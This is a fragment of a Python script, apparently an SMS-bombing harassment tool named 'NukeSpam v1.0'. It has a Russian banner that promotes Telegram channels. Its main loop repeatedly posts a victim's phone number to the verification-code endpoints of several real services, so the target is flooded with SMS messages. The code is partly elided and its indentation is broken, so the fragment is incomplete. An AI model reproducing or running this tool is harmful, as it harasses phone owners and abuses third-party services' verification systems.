...
os.system("clear")
print(Fore.CYAN + ''' 
SSSSSSSSSSSSS7SSSSSSSSSSSS
SSSSSSSSSSSSS7SSSSSSSSSSSS
NNN  NNNNN  N7S        SSS
NNN   NNNN  N7S  SSSSSSSSS
NNN  N NNN  N7S  SSSSSSSSS
NNN  NN NN  N7S        SSS
NNN  NNN N  N7SSSSSSS  SSS
NNN  NNNN   N7SSSSSSS  SSS
NNN  NNNNN  N7S        SSS
NNNNNNNNNNNNN7NNNNNNNNNNNN
NNNNNNNNNNNNN7NNNNNNNNNNNN
NNN   NukeSpam  v1.0   SSS
NNNNNNNNNNNNN7SSSSSSSSSSSS
NNN Наш Tgram канал:   SSS
NN       t.me/pialhack  SS
N                        S
NN  Разработчик:        SS
NNN      t.me/eToNuKTo SSS
NNNNNNNNNNNNN7SSSSSSSSSSSS
''') 
...
def infinity():
	while True:
		...
		try:
		   ...
		   print(Fore.GREEN + '''{+} FoodBand Отправлено!''')
		except:
		...
		try:
		   ...
		   requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
		print(Fore.GREEN + '''{+} Citilink Oтправлено!''')
		   
		try:
		   requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
		   print(Fore.GREEN + '''{+} AnyTime Отправлено!''')
		except:
		   print(Fore.RED + '''{-} AnyTime Hе отправлено!''')
